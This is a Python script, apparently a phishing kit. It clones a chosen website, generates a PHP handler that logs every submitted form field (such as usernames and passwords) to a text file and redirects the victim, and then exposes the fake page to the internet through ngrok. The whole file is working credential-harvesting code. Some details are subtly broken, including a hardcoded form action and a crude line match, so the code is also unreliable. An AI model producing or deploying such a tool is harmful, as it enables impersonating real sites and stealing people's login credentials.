import os
import sys
import traceback
import urllib.request
import urllib.error
import urllib.parse
from colorama import Fore, Style, Back
from flask import Flask
from flask_ngrok import run_with_ngrok

def ngrok():
    app = Flask(__name__)
    run_with_ngrok(app)  # Start ngrok when app is run

    @app.route("/")
    def hello():
        return open("index.html")

    app.run()

os.system('cls' if os.name == 'nt' else 'clear')
# Print name and description
print(Fore.RED + """

 ██▓███ ▓██   ██▓ ██▓███   ██░ ██  ██▓  ██████  ██░ ██ ▓█████  ██▀███
▓██░  ██▒▒██  ██▒▓██░  ██▒▓██░ ██▒▓██▒▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒
▓██░ ██▓▒ ▒██ ██░▓██░ ██▓▒▒██▀▀██░▒██▒░ ▓██▄   ▒██▀▀██░▒███   ▓██ ░▄█ ▒
▒██▄█▓▒ ▒ ░ ▐██▓░▒██▄█▓▒ ▒░▓█ ░██ ░██░  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██▀▀█▄
▒██▒ ░  ░ ░ ██▒▓░▒██▒ ░  ░░▓█▒░██▓░██░▒██████▒▒░▓█▒░██▓░▒████▒░██▓ ▒██▒
▒▓▒░ ░  ░  ██▒▒▒ ▒▓▒░ ░  ░ ▒ ░░▒░▒░▓  ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░
░▒ ░     ▓██ ░▒░ ░▒ ░      ▒ ░▒░ ░ ▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░  ░▒ ░ ▒░
░░       ▒ ▒ ░░  ░░        ░  ░░ ░ ▒ ░░  ░  ░   ░  ░░ ░   ░     ░░   ░
         ░ ░               ░  ░  ░ ░        ░   ░  ░  ░   ░  ░   ░
         ░ ░

        """)
# Ask user input for url
_url = input('Website to copy (ex http://google.com): ')
# Ask user input for logs file name
_logsfilename = input('Logs file name: ')+".txt"
# Ask user input for PHP file name
_phpfilename = input('PHP file name: ')+".php"
# Ask user input for where to redirect
_redirect = input('Redirect to: ')

# PHP script to add credentials to log
php = '<?php\nheader (\'Location: '+_redirect+' \');\n$handle = fopen("'+_logsfilename + \
    '", "a");\nforeach($_POST as $variable => $value) {\n\tfwrite($handle, $variable);\n\tfwrite($handle, "=");\n\tfwrite($handle, $value);\n\tfwrite($handle, "\\r\\n");}\nfwrite($handle, "===============\\r\\n");\nfclose($handle);\nexit;\n?>'

# Open PHP file, write script then close it
php_file = open(_phpfilename, 'w')
php_file.write(php)
php_file.close()

# Read webpage source code
response = urllib.request.urlopen(_url)
page_source = response.read()
html_file = open("index.html", "w")
html_file.write(str(page_source))
final_source = ""
with open('index.html') as f:
    for line in f:
        if line.find("forms") == -1:
            final_source = final_source+"\n"+line
        else:
            final_source = final_source+"\n" + \
                '<form name="f1" method="post" action=login.php?"login.php" id="f1">'
    html_file.close()
    html_file = open("index.html", "w")
    html_file.write(final_source)
    html_file.close()
    print(Fore.WHITE + "")
    ngrok()


